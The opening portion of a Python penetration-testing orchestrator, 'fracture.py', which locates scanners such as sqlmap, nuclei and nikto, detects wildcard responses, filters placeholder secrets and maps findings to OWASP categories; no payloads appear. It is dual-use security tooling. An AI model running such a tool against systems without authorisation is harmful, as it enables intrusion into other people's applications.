#!/usr/bin/env python3
"""
fracture.py — Web Application Penetration Testing Orchestrator

Performs comprehensive web application security assessment including
recon, TLS analysis, header inspection, crawling, injection testing,
traversal, SSRF, authentication bypass, file exposure, vulnerability
scanning, GraphQL testing, authorization testing, session analysis,
CSRF, and cross-user data leakage detection.

Works on Linux, macOS, and Windows.
"""

# ─────────────────────────────────────────────
# Standard-library imports  (always available)
# ─────────────────────────────────────────────
import sys
import os
import subprocess
import importlib
import importlib.util
import platform
import re
import shutil
import argparse
import json
import csv
import socket
import threading
import signal
import getpass
import difflib
import secrets
import statistics
import tempfile
import time
import hashlib
import urllib.parse
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

VERSION = "1.4.4"

# ─────────────────────────────────────────────
# Tool discovery helpers
# ─────────────────────────────────────────────
# When Fracture is run via sudo (e.g. by Arsenal), the PATH may be minimal
# and exclude /usr/local/bin where Homebrew installs tools on macOS.
# _find_tool() falls back to known absolute paths when shutil.which() fails.


def _real_home() -> Path:
    """Return the real user's home directory even when running under sudo."""
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        try:
            import pwd
            return Path(pwd.getpwnam(sudo_user).pw_dir)
        except Exception:
            pass
    return Path.home()


_HOME = _real_home()

_TOOL_PATHS: dict = {
    "nikto": {
        "Darwin": ["/usr/local/bin/nikto", "/opt/homebrew/bin/nikto",
                   "/usr/bin/nikto", "/usr/local/Cellar/nikto/2.6.0/bin/nikto"],
        "Linux":  ["/usr/bin/nikto", "/usr/local/bin/nikto",
                   "/opt/nikto/program/nikto.pl"],
    },
    "nuclei": {
        "Darwin": ["/usr/local/bin/nuclei", "/opt/homebrew/bin/nuclei",
                   str(_HOME / "go" / "bin" / "nuclei"),
                   "/root/go/bin/nuclei"],
        "Linux":  ["/usr/local/bin/nuclei", "/usr/bin/nuclei",
                   str(_HOME / "go" / "bin" / "nuclei"),
                   "/root/go/bin/nuclei", "/opt/nuclei/nuclei"],
    },
    "gobuster": {
        "Darwin": ["/usr/local/bin/gobuster", "/opt/homebrew/bin/gobuster",
                   str(_HOME / "go" / "bin" / "gobuster"),
                   "/root/go/bin/gobuster"],
        "Linux":  ["/usr/bin/gobuster", "/usr/local/bin/gobuster",
                   "/opt/gobuster/gobuster",
                   str(_HOME / "go" / "bin" / "gobuster"),
                   "/root/go/bin/gobuster"],
    },
    "wpscan": {
        "Darwin": ["/usr/local/bin/wpscan", "/opt/homebrew/bin/wpscan"],
        "Linux":  ["/usr/bin/wpscan", "/usr/local/bin/wpscan",
                   "/opt/wpscan/bin/wpscan"],
    },
    "shcheck": {
        "Darwin": ["/opt/shcheck/shcheck.py", "/usr/local/bin/shcheck.py",
                   "/usr/local/bin/shcheck"],
        "Linux":  ["/opt/shcheck/shcheck.py", "/usr/local/bin/shcheck.py",
                   "/usr/bin/shcheck", "/usr/local/bin/shcheck"],
    },
    "sslscan": {
        "Darwin": ["/usr/local/bin/sslscan", "/opt/homebrew/bin/sslscan"],
        "Linux":  ["/usr/bin/sslscan", "/usr/local/bin/sslscan"],
    },
    "testssl.sh": {
        "Darwin": ["/opt/testssl.sh/testssl.sh", "/usr/local/bin/testssl.sh",
                   "/opt/homebrew/bin/testssl.sh"],
        "Linux":  ["/opt/testssl.sh/testssl.sh", "/usr/local/bin/testssl.sh",
                   "/usr/bin/testssl.sh"],
    },
    "feroxbuster": {
        "Darwin": ["/usr/local/bin/feroxbuster", "/opt/homebrew/bin/feroxbuster"],
        "Linux":  ["/usr/bin/feroxbuster", "/usr/local/bin/feroxbuster",
                   "/opt/feroxbuster/feroxbuster"],
    },
    "whatweb": {
        "Darwin": ["/usr/local/bin/whatweb", "/opt/homebrew/bin/whatweb",
                   "/opt/homebrew/opt/ruby/bin/whatweb",
                   str(_HOME / ".gem" / "ruby" / "bin" / "whatweb")],
        "Linux":  ["/usr/bin/whatweb", "/usr/local/bin/whatweb",
                   "/opt/whatweb/whatweb",
                   str(_HOME / ".gem" / "ruby" / "bin" / "whatweb")],
    },
    "ffuf": {
        "Darwin": ["/usr/local/bin/ffuf", "/opt/homebrew/bin/ffuf",
                   str(_HOME / "go" / "bin" / "ffuf"),
                   "/root/go/bin/ffuf"],
        "Linux":  ["/usr/bin/ffuf", "/usr/local/bin/ffuf",
                   str(_HOME / "go" / "bin" / "ffuf"),
                   "/root/go/bin/ffuf"],
    },
    "searchsploit": {
        "Darwin": ["/usr/local/bin/searchsploit", "/opt/homebrew/bin/searchsploit",
                   "/opt/exploitdb/searchsploit"],
        "Linux":  ["/usr/bin/searchsploit", "/usr/local/bin/searchsploit",
                   "/opt/exploitdb/searchsploit"],
    },
    "sqlmap": {
        "Darwin": ["/usr/local/bin/sqlmap", "/opt/homebrew/bin/sqlmap",
                   "/opt/sqlmap/sqlmap.py"],
        "Linux":  ["/usr/bin/sqlmap", "/usr/local/bin/sqlmap",
                   "/opt/sqlmap/sqlmap.py"],
    },
    "dalfox": {
        "Darwin": ["/usr/local/bin/dalfox", "/opt/homebrew/bin/dalfox",
                   str(_HOME / "go" / "bin" / "dalfox"),
                   "/root/go/bin/dalfox"],
        "Linux":  ["/usr/bin/dalfox", "/usr/local/bin/dalfox",
                   str(_HOME / "go" / "bin" / "dalfox"),
                   "/root/go/bin/dalfox"],
    },
    "jwt_tool": {
        "Darwin": ["/opt/jwt_tool/jwt_tool.py", "/usr/local/bin/jwt_tool",
                   "/usr/local/bin/jwt_tool.py"],
        "Linux":  ["/opt/jwt_tool/jwt_tool.py", "/usr/local/bin/jwt_tool",
                   "/usr/bin/jwt_tool", "/usr/local/bin/jwt_tool.py"],
    },
}


_GEM_TOOLS = {"whatweb", "wpscan"}


def _find_tool(name: str) -> "str | None":
    """Return path to *name*, checking PATH then known absolute locations."""
    found = shutil.which(name)
    if found:
        return found
    for p in _TOOL_PATHS.get(name, {}).get(platform.system(), []):
        if Path(p).exists():
            return p
    # Fallback: ask gem for its directories (covers versioned/user gem installs)
    if name in _GEM_TOOLS:
        for gem in filter(None, [shutil.which("gem"), "/usr/local/bin/gem",
                                  "/opt/homebrew/bin/gem", "/usr/bin/gem"]):
            if not Path(gem).exists():
                continue
            try:
                env_out = subprocess.run([gem, "environment"],
                                         capture_output=True, text=True, timeout=5)
                if env_out.returncode == 0:
                    in_gem_paths = False
                    for line in env_out.stdout.splitlines():
                        # EXECUTABLE DIRECTORY: /usr/local/bin
                        if "EXECUTABLE DIRECTORY:" in line:
                            exec_dir = line.split(":", 1)[1].strip()
                            candidate = Path(exec_dir) / name
                            if candidate.exists():
                                return str(candidate)
                            in_gem_paths = False
                        # GEM PATHS: section — each indented line is a path
                        elif "GEM PATHS:" in line:
                            in_gem_paths = True
                        elif in_gem_paths:
                            gem_path = line.strip().lstrip("- ")
                            if not gem_path or gem_path.startswith("-"):
                                in_gem_paths = False
                                continue
                            candidate = Path(gem_path) / "bin" / name
                            if candidate.exists():
                                return str(candidate)
            except Exception:
                pass
            break  # only try the first usable gem binary found
    return None


# Flat wordlist directory populated by fracture's install.py --wordlists phase.
# macOS: /usr/share is SIP-protected; use /usr/local/share/wordlists instead.
_WORDLISTS_DIR = (
    Path("C:/wordlists")               if platform.system() == "Windows"
    else Path("/usr/local/share/wordlists") if platform.system() == "Darwin"
    else Path("/usr/share/wordlists")
)

_SECLISTS_BASES = [
    "/usr/share/seclists",
    "/usr/local/share/seclists",        # Intel Mac Homebrew
    "/opt/homebrew/share/seclists",     # Apple Silicon Homebrew
    "/usr/share/wordlists/seclists",
    "/opt/seclists",
]


def _find_wordlist(rel_path: str, cfg_override: str = "") -> str:
    """Return an existing wordlist path.

    Search order:
      1. cfg_override (or rel_path) if it exists directly.
      2. _WORDLISTS_DIR / basename(rel_path)  — flat dir installed by install.py.
      3. Each _SECLISTS_BASES entry / rel_path — full seclists install.
      4. Falls back to _WORDLISTS_DIR / basename so missing-path messages are
         consistent and point to the canonical install location.
    """
    primary = cfg_override or rel_path
    if Path(primary).exists():
        return primary
    basename = Path(rel_path).name
    flat = _WORDLISTS_DIR / basename
    if flat.exists():
        return str(flat)
    for base in _SECLISTS_BASES:
        candidate = Path(base) / rel_path
        if candidate.exists():
            return str(candidate)
    return str(flat)


def _find_shcheck() -> "str | None":
    """Return path to shcheck (may be a .py script)."""
    return _find_tool("shcheck") or _find_tool("shcheck.py")


def _clients_base() -> Path:
    """Return the OS-appropriate default parent directory for client project folders."""
    system = platform.system()
    if system == "Windows":
        base = Path("C:/clients")
    elif system == "Darwin":
        base = Path("/Users/Shared/clients")
    else:
        base = Path("/clients")
    base.mkdir(parents=True, exist_ok=True)
    return base


def _build_project_dir(client_short: str, start_date: str, tool_name: str) -> Path:
    """
    Build a structured project directory:
      <clients_base>/<client_short>/<year>/<tool_name>/<client_short>_<datetime>/
    """
    slug = re.sub(r'[^\w-]', '_', (client_short or 'client').strip().lower()).strip('_') or 'client'
    year = (start_date[:4] if start_date and len(start_date) >= 4 and start_date[:4].isdigit()
            else datetime.now().strftime('%Y'))
    dt_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    path = _clients_base() / slug / year / tool_name / f"{slug}_{dt_str}"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _write_project_meta(project_dir: Path, tool: str, client_short: str,
                        year: str, version: str) -> None:
    """Write project_meta.json so Flask apps can discover this project."""
    try:
        (project_dir / "project_meta.json").write_text(
            json.dumps({
                "tool":         tool,
                "client_short": client_short,
                "year":         year,
                "created_at":   datetime.now().isoformat(),
                "version":      version,
            }, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass


# ─────────────────────────────────────────────────────────────────────────────
# Finding title normalisation
# ─────────────────────────────────────────────────────────────────────────────
_TITLE_NORM_SUBS = [
    (re.compile(r'TLSv?[\s_]?1\.?0',     re.IGNORECASE), 'TLS 1.0'),
    (re.compile(r'TLSv?[\s_]?1\.?1',     re.IGNORECASE), 'TLS 1.1'),
    (re.compile(r'SSLv?[\s_]?2(?:\.0)?', re.IGNORECASE), 'SSLv2'),
    (re.compile(r'SSLv?[\s_]?3(?:\.0)?', re.IGNORECASE), 'SSLv3'),
]

# ─────────────────────────────────────────────
# Generic-404 / catch-all baseline helpers
# ─────────────────────────────────────────────

# ── Wildcard / catch-all detection ───────────────────────────────────────────
#
# Strategy: send 3 probes to randomly-generated paths that cannot plausibly
# exist on the target.  If all probes agree on status code AND their normalised
# bodies are structurally similar, the server is treating every path as valid
# (wildcard / catch-all behaviour).
#
# Two layers of similarity are checked:
#   • body-length ratio — size difference relative to the larger body
#   • word-count ratio  — same idea on token count
#   • SequenceMatcher ratio — structural diff on the first 8 KB (after stripping
#     the injected probe path so reflection doesn't fool the comparison)
#
# At least 2 of the 3 signals must exceed their thresholds before a wildcard is
# declared.  The returned baseline dict is consumed by _is_wildcard_match() to
# filter individual URLs found by crawl, admin-panel detection, etc.

_WC_LEN_TOLERANCE    = 0.08   # 8 % body-length difference
_WC_WORD_TOLERANCE   = 0.10   # 10 % word-count difference
_WC_SIMILARITY_RATIO = 0.88   # difflib SequenceMatcher ratio threshold
_WC_SAMPLE_SIZE      = 8192   # bytes fed to SequenceMatcher (cap for O(n²))


def _wc_body_fp(text: str, probe_paths: "list[str]") -> dict:
    """Return a multi-signal fingerprint of *text* after stripping injected probe paths."""
    norm = text
    for p in probe_paths:
        if not p:
            continue
        # Strip bare path and URL-encoded variant so reflection doesn't skew comparison
        norm = norm.replace(p, "__WC_PROBE__")
        norm = norm.replace(urllib.parse.quote(p), "__WC_PROBE__")
        norm = norm.replace(urllib.parse.quote(p, safe=""), "__WC_PROBE__")
    sample = norm[:_WC_SAMPLE_SIZE]
    return {
        "hash":   hashlib.md5(sample.encode("utf-8", errors="replace")).hexdigest(),
        "words":  len(norm.split()),
        "lines":  norm.count("\n") + 1,
        "length": len(text),
        "sample": sample,
    }


def _detect_wildcard(base_url: str, sess: "requests.Session",
                     timeout: int = 10) -> "dict | None":
    """Probe *base_url* with three random paths to detect catch-all/wildcard behaviour.

    Returns a baseline dict when wildcard is confirmed, or None when the server
    responds normally (404/410 for nonexistent paths, or probe responses differ).

    The returned dict is passed to _is_wildcard_match() to classify responses
    from crawl, admin-panel detection, file-exposure, and brute-force phases.
    When a wildcard is confirmed, directory brute-forcers (gobuster/feroxbuster)
    are skipped entirely since every path would appear to exist.
    """
    base = base_url.rstrip("/")

    # Three probes with different shapes to defeat path-aware logic and caches
    probe_paths = [
        f"/{secrets.token_hex(12)}-notfound",
        f"/nonexistent-{secrets.token_hex(8)}/deep/{secrets.token_hex(6)}.html",
        f"/{secrets.token_hex(14)}.php",
    ]

    responses: list = []
    for path in probe_paths:
        try:
            r = sess.get(base + path, timeout=timeout, allow_redirects=False)
            responses.append((path, r))
        except Exception:
            pass  # network error on one probe is not conclusive

    if len(responses) < 2:
        return None  # not enough data to determine

    # All available probes must agree on status code
    statuses = [r.status_code for _, r in responses]
    if len(set(statuses)) != 1:
        return None  # probes disagree → not a uniform wildcard

    status = statuses[0]

    # Legitimate 404/410 → clean server → not a wildcard
    if status in (404, 410):
        return None

    # Redirect wildcard: every unknown path redirects to the same Location
    if status in (301, 302, 303, 307, 308):
        locations = [r.headers.get("Location", "") for _, r in responses]
        if len(set(locations)) == 1 and locations[0]:
            return {
                "status":      status,
                "location":    locations[0],
                "body_len":    0.0,
                "word_count":  0.0,
                "line_count":  0.0,
                "body_hash":   "",
                "sample":      "",
                "probe_paths": probe_paths,
                "redirect":    True,
            }
        return None  # redirects differ → not uniform

    # For 200/403/other: compare body fingerprints across probes
    fps = [_wc_body_fp(r.text, probe_paths) for _, r in responses]

    def _ratio_ok(a: float, b: float, tol: float) -> bool:
        mx = max(a, b, 1)
        return abs(a - b) / mx < tol

    votes = 0

    # Signal 1 — body length ratio (first two probes)
    if _ratio_ok(fps[0]["length"], fps[1]["length"], _WC_LEN_TOLERANCE):
        votes += 1

    # Signal 2 — word count ratio
    if _ratio_ok(fps[0]["words"], fps[1]["words"], _WC_WORD_TOLERANCE):
        votes += 1

    # Signal 3 — structural similarity via SequenceMatcher
    sm_ratio = difflib.SequenceMatcher(
        None, fps[0]["sample"], fps[1]["sample"], autojunk=True
    ).ratio()
    if sm_ratio >= _WC_SIMILARITY_RATIO:
        votes += 1

    if votes < 2:
        return None  # probes differ enough — not a wildcard

    # Wildcard confirmed.  Build a representative baseline from the available probes.
    lengths = [f["length"] for f in fps]
    words   = [f["words"]  for f in fps]
    lines   = [f["lines"]  for f in fps]
    med_len = statistics.median(lengths)
    # Use the probe closest to the median length as the representative sample
    rep_idx = min(range(len(fps)), key=lambda i: abs(fps[i]["length"] - med_len))

    return {
        "status":      status,
        "location":    None,
        "body_len":    med_len,
        "word_count":  statistics.median(words),
        "line_count":  statistics.median(lines),
        "body_hash":   fps[rep_idx]["hash"],
        "sample":      fps[rep_idx]["sample"],
        "probe_paths": probe_paths,
        "redirect":    False,
    }


def _is_wildcard_match(r: "requests.Response",
                       baseline: "dict | None") -> bool:
    """Return True when *r* matches the wildcard baseline (i.e. is a false positive).

    Called by admin-panel detection, file-exposure checks, crawl endpoint
    validation, and any other module that needs to confirm a URL is genuinely
    distinct from the server's catch-all response.

    Intentionally conservative: requires 2 of 3 independent signals to agree
    before discarding a candidate, to avoid silencing real findings.
    """
    if baseline is None:
        return False

    if r.status_code != baseline["status"]:
        return False

    # Redirect wildcard: same Location header = same catch-all redirect
    if baseline.get("redirect"):
        return r.headers.get("Location", "") == baseline["location"]

    probe_paths = baseline.get("probe_paths", [])
    fp = _wc_body_fp(r.text, probe_paths)

    # Fast path: normalised hash is identical
    if fp["hash"] == baseline["body_hash"]:
        return True

    def _ratio_ok(a: float, b: float, tol: float) -> bool:
        mx = max(a, b, 1)
        return abs(a - b) / mx < tol

    votes = 0

    bl = baseline["body_len"]
    if bl > 0:
        if _ratio_ok(fp["length"], bl, _WC_LEN_TOLERANCE):
            votes += 1
    elif fp["length"] < 50:
        votes += 1  # both effectively empty

    bw = baseline["word_count"]
    if bw > 0:
        if _ratio_ok(fp["words"], bw, _WC_WORD_TOLERANCE):
            votes += 1
    elif fp["words"] < 5:
        votes += 1

    if baseline["sample"]:
        sm_ratio = difflib.SequenceMatcher(
            None, fp["sample"], baseline["sample"], autojunk=True
        ).ratio()
        if sm_ratio >= _WC_SIMILARITY_RATIO:
            votes += 1

    return votes >= 2


# ─────────────────────────────────────────────
# Placeholder / code-comment secret filter
# ─────────────────────────────────────────────

_PLACEHOLDER_RE = re.compile(
    r"""(?ix)
    ^(
        your[_\-]?password | change[_\-]?me | changeme | enter[_\-]?password |
        password(?:123|_here|go|example)? | pa[s$]{2}w[o0]rd | secret(?:_key|_here)? |
        example | placeholder | dummy | test(?:pass|ing|123)? | todo | fixme |
        x{3,} | null | none | undefined | n/a |
        your[_\-]?api[_\-]?key | api[_\-]?key[_\-]?here | token[_\-]?here |
        replace[_\-]?this | fill[_\-]?in | sample |
        \$\{[^}]+\} | \{{2}[^}]+\}{2} | %[a-z_]+% | <[^>]+>
    )$
    """,
    re.IGNORECASE | re.VERBOSE,
)

_TEMPLATE_SYNTAX_RE = re.compile(
    r'(?:[{<\[]\s*[A-Za-z_][A-Za-z0-9_\-]*\s*[}>:\]]|'   # {VAR}, <VAR>, [VAR]
    r'\$\{[^}]+\}|'                                          # ${VAR}
    r'%[A-Za-z_]+%)',                                        # %VAR%
)


def _is_placeholder_secret(value: str) -> bool:
    """Return True when the matched secret value is likely a template placeholder
    or code comment rather than a real credential.

    Called by the crawl phase before recording a password/secret finding.
    """
    v = (value or "").strip().strip("\"'")
    if not v:
        return True
    if _PLACEHOLDER_RE.match(v):
        return True
    if _TEMPLATE_SYNTAX_RE.search(v):
        return True
    # All-uppercase alphanumeric with underscores → ENV_VAR_STYLE_PLACEHOLDER
    if re.match(r'^[A-Z][A-Z0-9_]{3,}$', v):
        return True
    return False


def _normalize_finding_title(title: str) -> str:
    t = (title or "").strip()
    for pat, repl in _TITLE_NORM_SUBS:
        t = pat.sub(repl, t)
    return t


# ─────────────────────────────────────────────
# OWASP Top 10 2025 mapping
# ─────────────────────────────────────────────
_OWASP_TOP10: dict = {
    "A01": ("A01:2025 - Broken Access Control",
            "https://owasp.org/Top10/A01_2025-Broken_Access_Control/"),
    "A02": ("A02:2025 - Cryptographic Failures",
            "https://owasp.org/Top10/A02_2025-Cryptographic_Failures/"),
    "A03": ("A03:2025 - Injection",
            "https://owasp.org/Top10/A03_2025-Injection/"),
    "A04": ("A04:2025 - Insecure Design",
            "https://owasp.org/Top10/A04_2025-Insecure_Design/"),
    "A05": ("A05:2025 - Security Misconfiguration",
            "https://owasp.org/Top10/A05_2025-Security_Misconfiguration/"),
    "A06": ("A06:2025 - Vulnerable and Outdated Components",
            "https://owasp.org/Top10/A06_2025-Vulnerable_and_Outdated_Components/"),
    "A07": ("A07:2025 - Identification and Authentication Failures",
            "https://owasp.org/Top10/A07_2025-Identification_and_Authentication_Failures/"),
    "A08": ("A08:2025 - Software and Data Integrity Failures",
            "https://owasp.org/Top10/A08_2025-Software_and_Data_Integrity_Failures/"),
    "A09": ("A09:2025 - Security Logging and Monitoring Failures",
            "https://owasp.org/Top10/A09_2025-Security_Logging_and_Monitoring_Failures/"),
    "A10": ("A10:2025 - Server-Side Request Forgery",
            "https://owasp.org/Top10/A10_2025-Server-Side_Request_Forgery_%28SSRF%29/"),
}


def _owasp_auto(title: str) -> str:
    """Return the OWASP Top 10 2025 A-code that best fits a finding title."""
    t = (title or "").lower()
    if any(k in t for k in ("ssrf", "server-side request forgery", "server side request forgery")):
        return "A10"
    if any(k in t for k in ("sql injection", "sqli", "command injection", "code injection",
                             "ldap injection", "xpath injection", "xxe", "template injection",
                             "xss", "cross-site scripting", "html injection", "log4j", "injection")):
        return "A03"
    if any(k in t for k in ("broken access", "access control", "idor", "bola", "privilege",
                             "unauthorized", "path traversal", "directory traversal",
                             "insecure direct object")):
        return "A01"
    if any(k in t for k in ("tls", "ssl", "cipher", "certificate", "heartbleed", "poodle",
                             "beast", "crime", "drown", "logjam", "freak", "sweet32", "lucky13",
                             "rc4", "null cipher", "export cipher", "deprecated protocol",
                             "cryptograph", "weak cipher")):
        return "A02"
    if any(k in t for k in ("authentication", "session", "credential", "password", "login",
                             "jwt", "brute force", "account lockout", "multi-factor", "mfa",
                             "identification")):
        return "A07"
    if any(k in t for k in ("exploit", "searchsploit", "public exploit", "vulnerable", "outdated",
                             "component", "technology identified", "web server identified",
                             "technology stack")):
        return "A06"
    if any(k in t for k in ("deserialization", "integrity", "supply chain", "unsigned")):
        return "A08"
    if any(k in t for k in ("logging", "monitoring", "audit", "detection")):
        return "A09"
    if any(k in t for k in ("csrf", "cross-site request forgery", "insecure design")):
        return "A04"
    return "A05"


def _owasp_resolve(owasp: str, title: str = "") -> "tuple[str, str]":
    """Return (canonical_name, url) from an OWASP code/label, or auto-detect from title."""
    m = re.match(r'A(\d+)', owasp or "", re.I)
    if m:
        key = f"A{int(m.group(1)):02d}"
        entry = _OWASP_TOP10.get(key)
        if entry:
            return entry
    key = _owasp_auto(title)
    return _OWASP_TOP10.get(key, ("", ""))


def _parse_software(text: str) -> "tuple[str, str]":
    """Parse a software identifier into (name, version).

    'Apache/2.4.41 (Ubuntu)' → ('Apache', '2.4.41')
    'PHP/7.4.3'              → ('PHP', '7.4.3')
    'nginx 1.18.0'           → ('nginx', '1.18.0')
    'WordPress'              → ('WordPress', '')
    """
    text = re.sub(r'\s*\(.*?\)\s*', ' ', text).strip()
    if '/' in text:
        name, _, ver = text.partition('/')
        return name.strip(), ver.strip()
    m = re.match(r'^(.*?)\s+(\d[\d.\-a-zA-Z]*)$', text.strip())
    if m:
        return m.group(1).strip(), m.group(2).strip()
    return text.strip(), ""


# ─────────────────────────────────────────────
# Selenium / screenshot helpers  (lazy, optional)
# ─────────────────────────────────────────────

def _find_chromedriver() -> "str | None":
    """Return path to chromedriver, checking PATH then known absolute locations."""
    for name in ("chromedriver", "chromium-driver", "chromium.chromedriver"):
        found = shutil.which(name)
        if found:
            return found
    # _CHROMEDRIVER_PATHS is defined after the third-party imports block
    # but we keep this function early so it can be referenced by _build_chrome_service
    for p in [
        "/opt/homebrew/bin/chromedriver",
        "/usr/local/bin/chromedriver",
        "/usr/bin/chromedriver",
        "/usr/bin/chromium-driver",
        "/usr/bin/chromium.chromedriver",
        "/usr/lib/chromium/chromedriver",
        "/usr/lib/chromium-browser/chromedriver",
        "/snap/bin/chromium.chromedriver",
        "/private/tmp/chromedriver146/chromedriver-mac-x64/chromedriver",
    ]:
        if Path(p).exists():
            return p
    # macOS: ask brew for its prefix in case Homebrew root is non-standard
    if platform.system() == "Darwin":
        try:
            result = subprocess.run(
                ["brew", "--prefix"], capture_output=True, text=True, timeout=5,
            )
            prefix = result.stdout.strip()
            if prefix:
                candidate = Path(prefix) / "bin" / "chromedriver"
                if candidate.exists():
                    return str(candidate)
        except Exception:
            pass
        # Check real user's PATH entries when running under sudo
        sudo_user = os.environ.get("SUDO_USER", "")
        if sudo_user:
            sudo_path = os.environ.get("PATH", "")
            for d in sudo_path.split(":"):
                candidate = Path(d) / "chromedriver"
                if candidate.exists():
                    return str(candidate)
    return None


def _find_chrome_binary() -> "str | None":
    """Return path to Chrome/Chromium browser binary, or None."""
    if platform.system() == "Darwin":
        _MACOS_APPS = [
            ("Google Chrome.app", "Google Chrome"),
            ("Chromium.app",      "Chromium"),
            ("Brave Browser.app", "Brave Browser"),
            ("Microsoft Edge.app","Microsoft Edge"),
        ]
        app_roots = [Path("/Applications")]
        sudo_user = os.environ.get("SUDO_USER", "")
        if sudo_user:
            try:
                import pwd as _pwd
                user_home = Path(_pwd.getpwnam(sudo_user).pw_dir)
            except Exception:
                user_home = Path(f"/Users/{sudo_user}")
            app_roots.append(user_home / "Applications")
        else:
            app_roots.append(Path.home() / "Applications")
        for root in app_roots:
            for app_name, bin_name in _MACOS_APPS:
                candidate = root / app_name / "Contents" / "MacOS" / bin_name
                if candidate.exists():
                    return str(candidate)
    for p in [
        "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium", "/usr/bin/chromium-browser",
        "/snap/bin/chromium", "/usr/bin/brave-browser",
    ]:
        if Path(p).exists():
            return p
    for name in ("google-chrome", "google-chrome-stable", "chromium",
                 "chromium-browser", "brave-browser"):
        found = shutil.which(name)
        if found:
            return found
    return None


def _build_chrome_service():
    """Return a selenium Service object pointing at a usable chromedriver."""
    from selenium.webdriver.chrome.service import Service  # noqa: F401
    if platform.system() == "Darwin":
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            return Service(ChromeDriverManager().install())
        except Exception:
            pass
    driver = _find_chromedriver()
    if driver:
        return Service(driver)
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        return Service(ChromeDriverManager().install())
    except Exception as exc:
        raise RuntimeError(f"No chromedriver found: {exc}") from exc


def _check_selenium() -> bool:
    """Return True if selenium is importable and Chrome is available.  Result is cached."""
    global _SELENIUM_AVAILABLE
    if _SELENIUM_AVAILABLE is not None:
        return _SELENIUM_AVAILABLE
    try:
        from selenium import webdriver                          # noqa: F401
        from selenium.webdriver.chrome.options import Options  # noqa: F401
        _SELENIUM_AVAILABLE = True
        return True
    except ImportError:
        pass
    # macOS sudo: selenium may be installed for python3 but not in sys.path
    try:
        result = subprocess.run(
            ["python3", "-c", "import selenium"],
            capture_output=True, timeout=5,
        )
        if result.returncode == 0:
            site_res = subprocess.run(
                ["python3", "-c",
                 "import site, json; print(json.dumps(site.getsitepackages()))"],
                capture_output=True, text=True, timeout=5,
            )
            if site_res.returncode == 0:
                for p in json.loads(site_res.stdout.strip()):
                    if p and p not in sys.path:
                        sys.path.insert(0, p)
            try:
                from selenium import webdriver                          # noqa: F401
                from selenium.webdriver.chrome.options import Options  # noqa: F401
                _SELENIUM_AVAILABLE = True
                return True
            except ImportError:
                pass
    except Exception:
        pass
    _SELENIUM_AVAILABLE = False
    return False


# ─────────────────────────────────────────────
# Third-party dependency bootstrap
# ─────────────────────────────────────────────
_THIRD_PARTY_DEPS = [
    ("requests",      "requests",  "HTTP library for web probing"),
    ("colorama",      "colorama",  "ANSI color output"),
    ("beautifulsoup4","bs4",       "HTML parsing for crawl/form discovery"),
]

_REQUIRED_PKGS = {"requests", "colorama"}


def _is_importable(module: str) -> bool:
    try:
        return importlib.util.find_spec(module) is not None
    except (ModuleNotFoundError, ValueError):
        return False


def _pip_install(pkg: str, break_system: bool = False) -> tuple:
    pip_exe = "python3" if platform.system() == "Darwin" else sys.executable
    cmd = [pip_exe, "-m", "pip", "install", "--quiet"]
    if break_system:
        cmd.append("--break-system-packages")
    cmd.append(pkg)
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode == 0:
        return True, ""
    return False, (proc.stderr or proc.stdout).strip()


def _ensure_dependencies() -> None:
    missing = [
        (pkg, mod, desc)
        for pkg, mod, desc in _THIRD_PARTY_DEPS
        if not _is_importable(mod)
    ]
    if not missing:
        return

    _vantage_early = os.environ.get("CRUCIBLE_MANAGED", "") == "1"
    if _vantage_early:
        for pkg, mod, desc in missing:
            required = pkg in _REQUIRED_PKGS
            break_sys = platform.system() == "Linux"
            sys.stdout.write(f"[Vantage] Auto-installing Python package: {pkg} ...\n")
            sys.stdout.flush()
            ok, _err = _pip_install(pkg, break_system=break_sys)
            if ok:
                importlib.invalidate_caches()
                ok = _is_importable(mod)
            if ok:
                sys.stdout.write(f"[Vantage] {pkg} installed OK\n")
                sys.stdout.flush()
            elif required:
                sys.stderr.write(f"[Vantage] FATAL: could not install required package '{pkg}'.\n")
                sys.stderr.flush()
                sys.exit(1)
            else:
                sys.stdout.write(f"[Vantage] Warning: optional '{pkg}' install failed — some features may be unavailable.\n")
                sys.stdout.flush()
        return

    os_name = platform.system()
    print("\n[!] The following Python packages are not installed:\n")
    width = max(len(pkg) for pkg, _, _ in missing)
    for pkg, mod, desc in missing:
        tag = "[REQUIRED]" if pkg in _REQUIRED_PKGS else "[optional]"
        print(f"    {tag}  {pkg:<{width}}  —  {desc}")
    print()

    for pkg, mod, desc in missing:
        required  = pkg in _REQUIRED_PKGS
        req_label = "REQUIRED" if required else "optional"
        break_sys = os_name == "Linux"
        install_via = "pip --break-system-packages" if break_sys else "pip"

        try:
            answer = input(f"[?] Install '{pkg}' ({req_label}) via {install_via}? [Y/n]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            answer = "n"

        if answer in ("", "y", "yes"):
            print(f"    Installing {pkg} via pip ...", end="", flush=True)
            ok, err = _pip_install(pkg, break_system=break_sys)
            if ok:
                importlib.invalidate_caches()
                ok = _is_importable(mod)
            if ok:
                print(" done.")
            else:
                print(" FAILED.")
                if err:
                    for line in err.splitlines()[:6]:
                        print(f"    {line}")
                if required:
                    print(f"\n[!] '{pkg}' could not be installed and is required.\n"
                          f"    Fix:  pip install {pkg}\n"
                          f"    Then re-run fracture.py.\n")
                    sys.exit(1)
                else:
                    print(f"    [~] Continuing without '{pkg}'; some features may be unavailable.")
        else:
            if required:
                print(f"\n[!] '{pkg}' is required. Cannot continue without it.\n"
                      f"    Fix:  pip install {pkg}\n"
                      f"    Then re-run fracture.py.\n")
                sys.exit(1)
            else:
                print(f"    [~] Skipping '{pkg}'; some features may be unavailable.")

    print()


_ensure_dependencies()

# ─────────────────────────────────────────────
# Third-party imports  (guaranteed present now)
# ─────────────────────────────────────────────
warnings.filterwarnings("ignore", message="urllib3 v2 only supports OpenSSL")
import colorama                          # noqa: E402
import requests                          # noqa: E402
from colorama import Fore, Style         # noqa: E402

try:
    from bs4 import BeautifulSoup
    _BS4_AVAILABLE = True
except ImportError:
    _BS4_AVAILABLE = False

